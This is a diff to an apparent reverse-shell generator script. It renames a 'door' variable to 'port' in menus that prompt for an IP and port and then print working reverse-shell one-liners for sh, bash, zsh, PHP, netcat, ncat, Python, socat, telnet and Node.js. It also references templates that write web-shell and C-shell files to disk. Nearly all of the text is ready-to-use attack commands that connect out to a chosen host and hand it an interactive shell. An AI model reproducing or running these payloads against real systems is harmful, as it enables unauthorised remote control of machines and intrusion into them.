@@ -117,21 +117,21 @@ exit
                 Models Preview:"
        echo -e "$white
       🐚
-       ├── sh >> sh -i >& /dev/tcp/#ip/#door 0>&1
-       ├── zsh >> zsh -c 'zmodload zsh/net/tcp && ztcp #ip #door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
-       ├── bash >> bash -i >& /dev/tcp/#ip/#door 0>&1
-       ├── php exec >> php -r '"'$sock=fsockopen("#ip",#door);exec("bash <&3 >&3 2>&3");'"'
-       ├── nc -c >> nc -c bash #ip #door 
-       ├── nc -e >> nc #ip #door -e bash
-       ├── nc.exe -e >> nc.exe #ip #door -e bash
-       ├── nc mkfifo >> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc #ip #door >/tmp/f
-       ├── ncat -e >> ncat #ip #door -e bash
-       ├── ncat.exe -e >> ncat.exe #ip #door -e bash
-       ├── python >> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
-       ├── python3 >> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
-       ├── python3 short >> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("#ip",#door));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
-       ├── socat >> socat TCP:#ip:#door EXEC:'bash',pty,stderr,setsid,sigint,sane
-       ├── telnet >> TF=$(mktemp -u);mkfifo $TF && telnet #ip #door 0<$TF | bash 1>$TF
+       ├── sh >> sh -i >& /dev/tcp/#ip/#port 0>&1
+       ├── zsh >> zsh -c 'zmodload zsh/net/tcp && ztcp #ip #port && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+       ├── bash >> bash -i >& /dev/tcp/#ip/#port 0>&1
+       ├── php exec >> php -r '"'$sock=fsockopen("#ip",#port);exec("bash <&3 >&3 2>&3");'"'
+       ├── nc -c >> nc -c bash #ip #port 
+       ├── nc -e >> nc #ip #port -e bash
+       ├── nc.exe -e >> nc.exe #ip #port -e bash
+       ├── nc mkfifo >> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc #ip #port >/tmp/f
+       ├── ncat -e >> ncat #ip #port -e bash
+       ├── ncat.exe -e >> ncat.exe #ip #port -e bash
+       ├── python >> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+       ├── python3 >> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+       ├── python3 short >> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("#ip",#port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+       ├── socat >> socat TCP:#ip:#port EXEC:'bash',pty,stderr,setsid,sigint,sane
+       ├── telnet >> TF=$(mktemp -u);mkfifo $TF && telnet #ip #port 0<$TF | bash 1>$TF
        └── node.js >> require('child_process').exec('bash -i >& /dev/tcp/#ip/#port 0>&1');
 
       🕸️
@@ -148,11 +148,11 @@ exit
        echo 
        echo -e ">   🐚 ~ SH "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
 
-       👉 sh -i >& /dev/tcp/$ip/$door 0>&1
+       👉 sh -i >& /dev/tcp/$ip/$port 0>&1
                "   
                echo -e "$green $tip"
                echo -e "$white"    
@@ -161,11 +161,11 @@ exit
        echo 
        echo -e ">   🐚 ~ ZSH "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
 
-       👉 zsh -c 'zmodload zsh/net/tcp && ztcp $ip $door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+       👉 zsh -c 'zmodload zsh/net/tcp && ztcp $ip $port && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
                "
                echo -e "$green $tip"
                echo -e "$white"
@@ -175,11 +175,11 @@ exit
        echo 
        echo -e ">   🐚 ~ BASH "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
 
-       👉 bash -i >& /dev/tcp/$ip/$door 0>&1
+       👉 bash -i >& /dev/tcp/$ip/$port 0>&1
                "
                echo -e "$green $tip"
                echo -e "$white"       
@@ -188,11 +188,11 @@ exit
        echo 
        echo -e ">   🐚 ~ PHP Exec "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
 
-       👉 php -r '"'$sock=fsockopen("'"$ip"'",'$door');exec("bash <&3 >&3 2>&3");'"'
+       👉 php -r '"'$sock=fsockopen("'"$ip"'",'$port');exec("bash <&3 >&3 2>&3");'"'
                "
                echo -e "$green $tip"
                echo -e "$white"  
@@ -201,11 +201,11 @@ exit
        echo 
        echo -e ">   🐚 ~ NC -c "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 nc -c bash $ip $door
+       👉 nc -c bash $ip $port
                "
                echo -e "$green $tip"
                echo -e "$white"       
@@ -214,11 +214,11 @@ exit
        echo 
        echo -e ">   🐚 ~ NC -e "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 nc $ip $door -e bash
+       👉 nc $ip $port -e bash
                "
                echo -e "$green $tip"
                echo -e "$white"      
@@ -227,11 +227,11 @@ exit
        echo 
        echo -e ">   🐚 ~ NC.exe -e "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 nc.exe $ip $door -e bash
+       👉 nc.exe $ip $port -e bash
                "
                echo -e "$green $tip"
                echo -e "$white"       
@@ -240,24 +240,24 @@ exit
        echo 
        echo -e ">   🐚 ~ NC mkfifo "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $door >/tmp/f
+       👉 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $port >/tmp/f
                "
                echo -e "$green $tip"
                echo -e "$white"       
 ;; 
-"ncat")
+"ncat -e")
        echo 
        echo -e ">   🐚 ~ NCAT "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 ncat $ip $door -e bash
+       👉 ncat $ip $port -e bash
                "
                echo -e "$green $tip"
                echo -e "$white"       
@@ -266,11 +266,11 @@ exit
        echo 
        echo -e ">   🐚 ~ NCAT.exe -e "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 ncat.exe $ip $door -e bash
+       👉 ncat.exe $ip $port -e bash
                "
                echo -e "$green $tip"
                echo -e "$white"   
@@ -279,11 +279,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Python "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 python -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
+       👉 python -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$port'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"         
@@ -292,11 +292,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Python3 "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 python3 -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
+       👉 python3 -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$port'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"     
@@ -305,11 +305,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Python3 Short "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 python3 -c '"'import os,pty,socket;s=socket.socket();s.connect(("'"$ip"'",'$door'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"'
+       👉 python3 -c '"'import os,pty,socket;s=socket.socket();s.connect(("'"$ip"'",'$port'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"'
                "
                echo -e "$green $tip"
                echo -e "$white"     
@@ -318,11 +318,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Socat "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 socat TCP:$ip:$door EXEC:'bash',pty,stderr,setsid,sigint,sane
+       👉 socat TCP:$ip:$port EXEC:'bash',pty,stderr,setsid,sigint,sane
                "
                echo -e "$green $tip"
                echo -e "$white"        
@@ -331,11 +331,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Telnet "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 TF=$(mktemp -u);mkfifo '"'$TF'"' && telnet $ip $door 0<'"'$TF'"' | bash 1>'"'$TF'"'
+       👉 TF=$(mktemp -u);mkfifo '"'$TF'"' && telnet $ip $port 0<'"'$TF'"' | bash 1>'"'$TF'"'
                "
                echo -e "$green $tip"
                echo -e "$white"        
@@ -344,11 +344,11 @@ exit
        echo 
        echo -e ">   🐚 ~ Node.js "
        read -p ">   📍 ~ IP: " ip
-       read -p ">   🚪 ~ DOOR: " door 
+       read -p ">   🚪 ~ PORT: " port 
        clear
        echo -e "> Shell:
        
-       👉 require('child_process').exec('bash -i >& /dev/tcp/$ip/$door 0>&1');
+       👉 require('child_process').exec('bash -i >& /dev/tcp/$ip/$port 0>&1');
                "
                echo -e "$green $tip"
                echo -e "$white"        
@@ -357,7 +357,7 @@ exit
        echo
        echo -e ">   🐚 ~ Web Shell "
        read -p ">   📍 ~ IP: " ALTERN1
-       read -p ">   🚪 ~ DOOR: " ALTERN2
+       read -p ">   🚪 ~ PORT: " ALTERN2
        read -p ">   📁 ~ Path to save the file: " path
        clear
        cat << 'EOF' > $path
@@ -506,7 +506,7 @@ EOF
       echo
        echo -e ">   🐚 ~ C Shell "
        read -p ">   📍 ~ IP: " ALTERN1
-       read -p ">   🚪 ~ DOOR: " ALTERN2
+       read -p ">   🚪 ~ PORT: " ALTERN2
        read -p ">   📁 ~ Path to save the file: " path
        clear
        cat << 'EOF' > $path
